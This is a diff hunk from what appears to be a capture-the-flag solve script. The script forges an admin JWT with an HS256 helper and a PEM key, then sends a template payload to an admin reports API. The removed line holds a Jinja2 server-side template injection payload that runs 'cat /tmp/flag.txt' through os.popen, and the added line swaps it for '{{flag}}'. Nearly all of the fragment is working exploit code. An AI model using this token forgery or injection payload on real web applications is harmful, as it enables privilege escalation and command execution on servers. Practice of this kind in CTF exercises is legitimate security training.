@@ -59,7 +59,7 @@ def solve():
     token = forge_hs256(
         {"sub": "1", "role": "admin", "username": "admin", "exp": 9999999999}, pem
     )
-    payload = "{{lipsum.__globals__['os'].popen('cat /tmp/flag.txt').read()}}"
+    payload = "{{flag}}"
     r = requests.get(
         f"{TARGET}/api/admin/reports",
         params={"template": payload},
